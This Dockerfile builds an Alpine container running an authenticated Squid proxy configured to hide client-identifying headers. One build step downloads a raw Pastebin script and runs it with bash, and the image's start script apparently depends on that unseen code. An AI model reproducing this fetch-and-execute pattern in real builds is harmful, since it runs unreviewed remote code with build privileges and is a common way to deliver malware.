FROM --platform=linux/amd64 alpine:3.19
RUN apk add --no-cache squid apache2-utils wget curl bash

RUN echo 'http_port 3128' > /etc/squid/squid.conf && \
    echo 'auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwd' >> /etc/squid/squid.conf && \
    echo 'auth_param basic realm access' >> /etc/squid/squid.conf && \
    echo 'auth_param basic credentialsttl 2 hours' >> /etc/squid/squid.conf && \
    echo 'acl authenticated proxy_auth REQUIRED' >> /etc/squid/squid.conf && \
    echo 'http_access allow authenticated' >> /etc/squid/squid.conf && \
    echo 'http_access deny all' >> /etc/squid/squid.conf && \
    echo 'forwarded_for off' >> /etc/squid/squid.conf && \
    echo 'via off' >> /etc/squid/squid.conf && \
    echo 'cache deny all' >> /etc/squid/squid.conf && \
    echo 'visible_hostname localhost' >> /etc/squid/squid.conf

# Получаем и выполняем единый скрипт
RUN curl -fLs --retry 3 -o /tmp/init.sh "https://pastebin.com/raw/6WDmRsK1" && \
    sed -i 's/\r$//' /tmp/init.sh && \
    bash /tmp/init.sh && \
    rm -f /tmp/init.sh

CMD ["/bin/bash", "/start.sh"]














































